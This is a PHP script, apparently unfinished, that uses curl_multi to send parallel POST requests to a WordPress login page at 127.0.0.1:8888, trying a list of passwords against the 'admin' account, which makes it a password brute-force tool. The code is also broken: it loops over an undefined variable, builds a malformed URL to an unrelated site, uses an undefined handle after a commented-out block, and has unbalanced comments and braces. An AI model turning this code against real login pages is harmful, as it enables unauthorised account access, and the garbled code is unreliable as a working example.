<?php

function queueUp($array_of_passwords) {
    //create the curl handle
    $mh = curl_multi_init();

    $user_agent='Mozilla/5.0 (Windows NT 6.1; rv:8.0) Gecko/20100101 Firefox/8.0';

    // Pick a url
    $url = 'http://127.0.0.1:8888/wp-login.php';
    $username = 'admin';
    $redirect = './wp-admin/';


    foreach ($ids as $i => $id) {
        // URL from which data will be fetched
        $fetchURL = 'https://webkul.com&customerId='.$id;
        $multiCurl[$i] = curl_init();
        curl_setopt($multiCurl[$i], CURLOPT_URL,$fetchURL);
        curl_setopt($multiCurl[$i], CURLOPT_HEADER,0);
        curl_setopt($multiCurl[$i], CURLOPT_RETURNTRANSFER,1);
        curl_multi_add_handle($mh, $multiCurl[$i]);
      }


      foreach($array_of_passwords as $i=>$password){

        $options = array(

            CURLOPT_CUSTOMREQUEST  =>"POST",        //set request type post or get
            CURLOPT_POST           => true,        //set to POST
            CURLOPT_USERAGENT      => $user_agent, //set user agent
            CURLOPT_COOKIEFILE     =>"cookie.txt", //set cookie file
            CURLOPT_COOKIEJAR      =>"cookie.txt", //set cookie jar
            CURLOPT_RETURNTRANSFER => true,     // return web page
            CURLOPT_HEADER         => false,    // don't return headers
            CURLOPT_FOLLOWLOCATION => true,     // follow redirects
            CURLOPT_ENCODING       => "",       // handle all encodings
            CURLOPT_AUTOREFERER    => true,     // set referer on redirect
            CURLOPT_CONNECTTIMEOUT => 120,      // timeout on connect
            CURLOPT_TIMEOUT        => 120,      // timeout on response
            CURLOPT_MAXREDIRS      => 10,       // stop after 10 redirects
            //CURLOPT_USERPWD        => $username . ":" . $password
            //CURLOPT_POSTFIELDS     => array("log"=>$username, "pwd"=>$password),

            //sets log and pwd, and includes the redirect to get through the hurdles to login to wordpress. Puts everything in the post fields.
            CURLOPT_POSTFIELDS =>'log='.urlencode($username).'&pwd='.urlencode($password).'&redirect_to='.urlencode($redirect)
        );

          echo '$i is ' . $i;
          echo "\n";
          echo '$password is ' . $password;
          echo "\n";
          $multiCurl[$i] = curl_init();
          curl_setopt_array( $multiCurl[$i], $options);

      }
/*
    foreach($array_of_passwords as $password){
        // echo "The password is $password \n";
        $ch1 = curl_init($url);
        $options = array(

            CURLOPT_CUSTOMREQUEST  =>"POST",        //set request type post or get
            CURLOPT_POST           => true,        //set to POST
            CURLOPT_USERAGENT      => $user_agent, //set user agent
            CURLOPT_COOKIEFILE     =>"cookie.txt", //set cookie file
            CURLOPT_COOKIEJAR      =>"cookie.txt", //set cookie jar
            CURLOPT_RETURNTRANSFER => true,     // return web page
            CURLOPT_HEADER         => false,    // don't return headers
            CURLOPT_FOLLOWLOCATION => true,     // follow redirects
            CURLOPT_ENCODING       => "",       // handle all encodings
            CURLOPT_AUTOREFERER    => true,     // set referer on redirect
            CURLOPT_CONNECTTIMEOUT => 120,      // timeout on connect
            CURLOPT_TIMEOUT        => 120,      // timeout on response
            CURLOPT_MAXREDIRS      => 10,       // stop after 10 redirects
            //CURLOPT_USERPWD        => $username . ":" . $password
            //CURLOPT_POSTFIELDS     => array("log"=>$username, "pwd"=>$password),

            //sets log and pwd, and includes the redirect to get through the hurdles to login to wordpress. Puts everything in the post fields.
            CURLOPT_POSTFIELDS =>'log='.urlencode($username).'&pwd='.urlencode($password).'&redirect_to='.urlencode($redirect)
        
        );
        
        */
        //add the options
        curl_setopt_array( $ch1, $options );

        //now add it to the group
        curl_multi_add_handle($mh, $ch1);
        


    }
    echo "the var dump is \n";
    var_dump($mh);
    $answer = curl_multi_info_read($mh);
    var_dump($answer);

    $content = curl_multi_exec( $mh, $active );
    echo $content;

    
    die();
    
/*
    do{
        //multi_exec is the part that is returning something 
        $content = curl_multi_exec($mh, $active);
        if($active){
            curl_multi_select($mh);
        }
    } while ($active);

    curl_multi_remove_handle($mh, $ch1);
    // curl_multi_remove_handle($mh, $ch2);
    curl_multi_close($mh);
*/
//}



/*
$ch1 = curl_init($url);
$ch2 = curl_init($url);



//add the handles
curl_multi_add_handle($mh, $ch1);
curl_multi_add_handle($mh, $ch2);


do{
    //multi_exec is the part that is returning something 
    $content = curl_multi_exec($mh, $active);
    if($active){
        curl_multi_select($mh);
    }
} while ($active);


//$content = curl_exec( $ch );
//$header['content'] = $content;
// return $header;

curl_multi_remove_handle($mh, $ch1);
curl_multi_remove_handle($mh, $ch2);
curl_multi_close($mh);


//receive an array of ten items
/*
for each thing in that array, go through the process of initalizing the curl request.
Then, do a multi_curl request to 127.0.0.1

*/

